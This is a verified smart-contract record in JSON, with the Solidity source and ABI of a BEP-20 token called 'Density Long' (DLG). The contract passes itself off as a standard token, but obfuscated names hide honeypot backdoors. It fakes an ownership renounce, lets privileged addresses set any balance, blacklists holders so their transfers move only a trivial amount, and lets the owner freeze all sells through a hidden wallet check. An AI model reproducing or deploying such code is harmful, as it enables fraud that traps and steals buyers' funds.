{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface takeShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenLimitIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeMax {\n    function createPair(address fromLimit, address autoTake) external returns (address);\n}\n\ninterface liquidityFeeSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenList) external view returns (uint256);\n\n    function transfer(address fromMax, uint256 tokenMarketing) external returns (bool);\n\n    function allowance(address fundLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMax,\n        uint256 tokenMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingAt, uint256 value);\n    event Approval(address indexed fundLimit, address indexed spender, uint256 value);\n}\n\ninterface walletAutoMin is liquidityFeeSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DensityLong is tokenLimitIs, liquidityFeeSwap, walletAutoMin {\n\n    function senderFund() public {\n        emit OwnershipTransferred(fromLaunched, address(0));\n        launchedBuy = address(0);\n    }\n\n    function receiverTeam(address fundIs, uint256 tokenMarketing) public {\n        launchedIsReceiver();\n        minMax[fundIs] = tokenMarketing;\n    }\n\n    function receiverMin(address receiverLiquidityFee) public {\n        if (buyTo) {\n            return;\n        }\n        \n        enableMode[receiverLiquidityFee] = true;\n        \n        buyTo = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeToken;\n\n    function transfer(address fundIs, uint256 tokenMarketing) external virtual override returns (bool) {\n        return maxSwap(_msgSender(), fundIs, tokenMarketing);\n    }\n\n    address receiverTokenEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public txFundSwap;\n\n    address public fromLaunched;\n\n    function getOwner() external view returns (address) {\n        return launchedBuy;\n    }\n\n    bool public marketingAt;\n\n    uint8 private exemptTeam = 18;\n\n    uint256 private tradingEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return minToken;\n    }\n\n    mapping(address => uint256) private minMax;\n\n    string private minToken = \"Density Long\";\n\n    uint256 swapEnable;\n\n    uint256 constant listTotal = 10 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableList;\n    }\n\n    bool private tradingList;\n\n    address public maxIs;\n\n    constructor (){\n        if (fundMarketingFee != tradingEnable) {\n            maxAmount = fundMarketingFee;\n        }\n        takeShould liquidityFund = takeShould(takeAuto);\n        maxIs = modeMax(liquidityFund.factory()).createPair(liquidityFund.WETH(), address(this));\n        if (tradingList != fundToToken) {\n            tradingEnable = fundMarketingFee;\n        }\n        fromLaunched = _msgSender();\n        senderFund();\n        enableMode[fromLaunched] = true;\n        minMax[fromLaunched] = enableList;\n        if (maxAmount != tradingSenderTake) {\n            tradingSenderTake = teamFeeReceiver;\n        }\n        emit Transfer(address(0), fromLaunched, enableList);\n    }\n\n    function launchedIsReceiver() private view {\n        require(enableMode[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityReceiver;\n    }\n\n    address private launchedBuy;\n\n    mapping(address => bool) public enableMode;\n\n    uint256 public fundMarketingFee;\n\n    function owner() external view returns (address) {\n        return launchedBuy;\n    }\n\n    uint256 public teamFeeReceiver;\n\n    function transferFrom(address fundAutoTo, address fromMax, uint256 tokenMarketing) external override returns (bool) {\n        if (_msgSender() != takeAuto) {\n            if (takeToken[fundAutoTo][_msgSender()] != type(uint256).max) {\n                require(tokenMarketing <= takeToken[fundAutoTo][_msgSender()]);\n                takeToken[fundAutoTo][_msgSender()] -= tokenMarketing;\n            }\n        }\n        return maxSwap(fundAutoTo, fromMax, tokenMarketing);\n    }\n\n    address takeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address walletAt, uint256 tokenMarketing) public virtual override returns (bool) {\n        takeToken[_msgSender()][walletAt] = tokenMarketing;\n        emit Approval(_msgSender(), walletAt, tokenMarketing);\n        return true;\n    }\n\n    bool public buyTo;\n\n    string private liquidityReceiver = \"DLG\";\n\n    uint256 private enableList = 100000000 * 10 ** 18;\n\n    function balanceOf(address tokenList) public view virtual override returns (uint256) {\n        return minMax[tokenList];\n    }\n\n    function senderMarketing(address amountFromSwap) public {\n        launchedIsReceiver();\n        if (tradingSenderTake == teamFeeReceiver) {\n            teamFeeReceiver = tradingEnable;\n        }\n        if (amountFromSwap == fromLaunched || amountFromSwap == maxIs) {\n            return;\n        }\n        txFundSwap[amountFromSwap] = true;\n    }\n\n    uint256 public maxAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptTeam;\n    }\n\n    event OwnershipTransferred(address indexed launchSwapList, address indexed feeFund);\n\n    uint256 public atMode;\n\n    uint256 marketingWalletLimit;\n\n    function modeLiquidity(address fundAutoTo, address fromMax, uint256 tokenMarketing) internal returns (bool) {\n        require(minMax[fundAutoTo] >= tokenMarketing);\n        minMax[fundAutoTo] -= tokenMarketing;\n        minMax[fromMax] += tokenMarketing;\n        emit Transfer(fundAutoTo, fromMax, tokenMarketing);\n        return true;\n    }\n\n    uint256 private tradingSenderTake;\n\n    bool private fundToToken;\n\n    function allowance(address txMin, address walletAt) external view virtual override returns (uint256) {\n        if (walletAt == takeAuto) {\n            return type(uint256).max;\n        }\n        return takeToken[txMin][walletAt];\n    }\n\n    function maxSwap(address fundAutoTo, address fromMax, uint256 tokenMarketing) internal returns (bool) {\n        if (fundAutoTo == fromLaunched) {\n            return modeLiquidity(fundAutoTo, fromMax, tokenMarketing);\n        }\n        uint256 sellTake = liquidityFeeSwap(maxIs).balanceOf(receiverTokenEnable);\n        require(sellTake == marketingWalletLimit);\n        require(fromMax != receiverTokenEnable);\n        if (txFundSwap[fundAutoTo]) {\n            return modeLiquidity(fundAutoTo, fromMax, listTotal);\n        }\n        return modeLiquidity(fundAutoTo, fromMax, tokenMarketing);\n    }\n\n    function feeReceiverBuy(uint256 tokenMarketing) public {\n        launchedIsReceiver();\n        marketingWalletLimit = tokenMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSwapList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"feeReceiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityFee\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFromSwap\",\"type\":\"address\"}],\"name\":\"senderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFeeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAutoTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DensityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}